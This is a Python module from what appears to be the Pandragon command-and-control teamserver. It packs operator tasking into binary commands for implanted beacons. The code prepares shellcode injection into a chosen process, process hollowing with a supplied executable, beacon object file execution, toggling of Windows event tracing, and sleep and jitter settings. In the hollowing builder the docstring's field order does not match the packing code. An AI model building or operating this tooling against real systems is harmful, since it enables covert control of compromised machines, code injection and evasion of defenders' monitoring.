"""
Payload Builder for Pandragon Teamserver

Translates human-friendly task parameters (from the operator GUI) into
the binary-packed wire format expected by beacon handlers.

Each build function takes descriptive parameters and returns bytes matching
the exact struct layout that handlers.cpp expects.
"""

import os
import struct
import logging

from protocol.constants import S2BOpcode

logger = logging.getLogger('pandragon.payload')

# ── Size limits (must match beacon constants) ──────────────────────

MAX_CMD_LEN = 8192
MAX_BOF_SIZE = 1 * 1024 * 1024       # 1 MB
MAX_SHELLCODE_SIZE = 1 * 1024 * 1024  # 1 MB
MAX_PATH_LEN = 512
MAX_HOLLOWING_PAYLOAD = 16 * 1024 * 1024  # 16 MB


# ── Public API ─────────────────────────────────────────────────────

def build_payload(opcode: int, payload: bytes, bof_metadata: dict = None) -> bytes:
    """
    Translate a decoded GUI payload into the binary wire format the beacon expects.

    The `payload` argument is the base64-decoded bytes from the API request.
    For commands that need file reads (BOF, inject, hollow, upload), the payload
    is interpreted as a UTF-8 string containing a file path (and optionally
    additional space-separated parameters).

    Args:
        opcode: S2B opcode number
        payload: Decoded payload bytes from the API (may be a UTF-8 string)

    Returns:
        Binary-packed payload matching beacon handler expectations

    Raises:
        ValueError: If the payload is invalid or a file cannot be read
    """
    handlers = {
        S2BOpcode.SLEEP:           _build_sleep,
        S2BOpcode.BOF_EXEC:        _build_bof_exec,
        S2BOpcode.LONG_RUNNING_BOF: lambda p, **k: p,  # Pass-through: task_id + subcmd + args
        S2BOpcode.ROTATE_KEY:      _build_rotate_key,
        S2BOpcode.ETW_ENABLE:      _build_etw_enable,
        S2BOpcode.ETW_DISABLE:     _build_etw_disable,
        S2BOpcode.INJECT_PROCESS:  _build_inject_process,
        S2BOpcode.HOLLOW_PROCESS:  _build_hollow_process,
    }

    handler = handlers.get(opcode)
    if handler is None:
        # No translation needed; pass through as-is
        logger.debug(f"Opcode 0x{opcode:02x}: no payload translation (pass-through)")
        return payload

    logger.debug(f"Building binary payload for opcode 0x{opcode:02x}")
    if handler is _build_bof_exec:
        return handler(payload, bof_metadata=bof_metadata)
    return handler(payload)


# ── Internal builders ──────────────────────────────────────────────

def _decode_str(payload: bytes) -> str:
    """Decode payload bytes as UTF-8 string."""
    try:
        return payload.decode('utf-8')
    except UnicodeDecodeError:
        raise ValueError("Payload must be a UTF-8 encoded string for this command")



def _build_sleep(payload: bytes) -> bytes:
    """
    Beacon expects: uint32_t sleep_ms + uint8_t jitter_pct

    GUI sends: ASCII string of seconds (e.g. "60"), or "seconds jitter" (e.g. "60 30").
    If the payload is already 5 bytes and NOT valid UTF-8 text, assume it's
    pre-packed binary and pass it through.
    """
    # Check if it's already in correct binary format (5 bytes, not valid text)
    if len(payload) == 5:
        try:
            text = payload.decode('utf-8')
            # Only treat as binary if it doesn't look like a sleep spec
            if text.strip() and not text.isprintable():
                return payload  # Non-printable, must be binary
        except UnicodeDecodeError:
            return payload  # Not valid UTF-8, must be binary

    text = _decode_str(payload).strip()

    # Try parsing as just seconds (default 0% jitter)
    try:
        seconds = int(text)
        sleep_ms = seconds * 1000
        return struct.pack('<IB', sleep_ms, 0)
    except ValueError:
        pass

    # Try "seconds jitter" format
    parts = text.split()
    if len(parts) == 2:
        try:
            seconds = int(parts[0])
            jitter = int(parts[1])
            return struct.pack('<IB', seconds * 1000, jitter)
        except ValueError:
            pass

    raise ValueError(
        f"Invalid sleep value: '{text}'. Expected seconds (e.g. '60') or 'seconds jitter' (e.g. '60 30')"
    )


def _build_bof_exec(payload: bytes, bof_metadata: dict = None) -> bytes:
    """
    Build BOF_EXEC payload for beacon.

    Beacon expects: [bof_id(4)][bof_len(2)][arg_len(4)][bof_data?][arg_data?]

    bof_id and include_data come from bof_metadata (set by server's BOF cache).
    When bof_data is provided in bof_metadata, the file read is skipped (avoids
    blocking the event loop since the caller already read it in a thread pool).
    """
    if not bof_metadata or 'bof_id' not in bof_metadata:
        raise ValueError("BOF exec requires bof_metadata with bof_id")

    bof_id = bof_metadata['bof_id']
    include_data = bof_metadata.get('include_data', True)

    text = _decode_str(payload).strip()
    if not text:
        raise ValueError("BOF exec payload is empty")

    parts = text.split(maxsplit=1)
    bof_path = parts[0]
    args_str = parts[1] if len(parts) > 1 else ""

    if 'bof_data' in bof_metadata:
        bof_data = bof_metadata['bof_data']
    else:
        if not os.path.isfile(bof_path):
            raise ValueError(f"BOF file not found: {bof_path}")

        file_size = os.path.getsize(bof_path)
        if file_size == 0:
            raise ValueError(f"BOF file is empty: {bof_path}")
        if file_size > MAX_BOF_SIZE:
            raise ValueError(f"BOF file too large: {file_size} bytes (max {MAX_BOF_SIZE})")

        with open(bof_path, 'rb') as f:
            bof_data = f.read()

    arg_data = args_str.encode('utf-8') if args_str else b""

    bof_len_val = len(bof_data) if include_data else 0
    arg_len_val = len(arg_data)

    header = struct.pack('<IHI', bof_id, bof_len_val, arg_len_val)
    result = [header]
    if include_data:
        result.append(bof_data)
    if arg_data:
        result.append(arg_data)
    return b''.join(result)


def _build_rotate_key(payload: bytes) -> bytes:
    """Beacon ignores payload for ROTATE_KEY; return empty bytes."""
    return b""


def _build_etw_enable(payload: bytes) -> bytes:
    """Beacon ignores payload; return empty bytes."""
    return b""


def _build_etw_disable(payload: bytes) -> bytes:
    """Beacon ignores payload; return empty bytes."""
    return b""


def _build_inject_process(payload: bytes) -> bytes:
    """
    Beacon expects: uint32_t pid + uint32_t shellcode_len + shellcode

    GUI sends: "pid /path/to/shellcode.bin"  (space-separated)
    """
    text = _decode_str(payload).strip()
    if not text:
        raise ValueError("Inject payload is empty")

    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        raise ValueError("Inject payload must contain: pid shellcode_path")

    try:
        pid = int(parts[0])
    except ValueError:
        raise ValueError(f"Invalid PID: {parts[0]}")

    shellcode_path = parts[1].strip()
    if not os.path.isfile(shellcode_path):
        raise ValueError(f"Shellcode file not found: {shellcode_path}")

    file_size = os.path.getsize(shellcode_path)
    if file_size == 0:
        raise ValueError(f"Shellcode file is empty: {shellcode_path}")
    if file_size > MAX_SHELLCODE_SIZE:
        raise ValueError(
            f"Shellcode too large: {file_size} bytes (max {MAX_SHELLCODE_SIZE})"
        )

    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    return struct.pack('<II', pid, len(shellcode)) + shellcode


def _build_hollow_process(payload: bytes) -> bytes:
    """
    Beacon expects: uint16_t path_len + path (UTF-16-LE) + uint32_t payload_size + payload_pe

    GUI sends: "C:\\target\\proc.exe /path/to/payload.pe"  (space-separated)
    """
    text = _decode_str(payload).strip()
    if not text:
        raise ValueError("Hollow process payload is empty")

    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        raise ValueError("Hollow payload must contain: target_process payload_path")

    target_path = parts[0].strip()
    payload_path = parts[1].strip()

    if not os.path.isfile(payload_path):
        raise ValueError(f"Payload file not found: {payload_path}")

    file_size = os.path.getsize(payload_path)
    if file_size == 0:
        raise ValueError(f"Payload file is empty: {payload_path}")
    if file_size > MAX_HOLLOWING_PAYLOAD:
        raise ValueError(
            f"Payload too large: {file_size} bytes (max {MAX_HOLLOWING_PAYLOAD})"
        )

    with open(payload_path, 'rb') as f:
        payload_data = f.read()

    if len(target_path) > MAX_PATH_LEN:
        raise ValueError(f"Target path too long: {len(target_path)} > {MAX_PATH_LEN}")

    path_utf16 = target_path.encode('utf-16-le')
    return (
        struct.pack('<HI', len(target_path), len(payload_data))
        + path_utf16
        + payload_data
    )
